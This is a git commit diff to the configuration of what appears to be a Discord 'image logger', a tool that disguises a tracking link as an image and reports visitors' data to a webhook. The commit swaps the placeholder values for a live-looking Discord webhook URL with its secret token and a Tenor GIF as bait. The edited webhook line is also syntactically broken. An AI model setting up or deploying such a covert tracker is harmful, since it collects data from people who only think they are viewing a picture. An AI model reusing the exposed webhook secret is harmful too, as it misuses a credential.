b57415a5196badd023bc75f991468396d739e7fb
Soyunmono420 <bananaman.7766ree@gmail.com>
2025-02-21 13:52:23 -0700

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1342598891287220294/Nt5Voc-fOLy8lwlahCBXYY0OZLpciZPujbrKYcrCWUMA8eTMyUnYF0WD3Mszi6Caw6VY
+    "image": "https://tenor.com/view/risa-gif-16195486589195288210", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
